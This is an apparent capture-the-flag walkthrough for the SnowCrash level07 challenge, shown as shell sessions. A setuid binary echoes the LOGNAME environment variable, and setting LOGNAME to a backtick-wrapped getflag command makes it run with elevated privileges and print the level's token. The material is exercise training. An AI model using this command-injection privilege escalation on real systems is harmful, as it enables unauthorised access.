
```sh
level07@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
level07@SnowCrash:~$ ./level07 
level07
```

```sh
level07@SnowCrash:~$ strings level07
...
LOGNAME
...
getenv
...
```

```sh
level07@SnowCrash:~$ LOGNAME=test
level07@SnowCrash:~$ ./level07 
test
level07@SnowCrash:~$ LOGNAME='`getflag`'
level07@SnowCrash:~$ ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```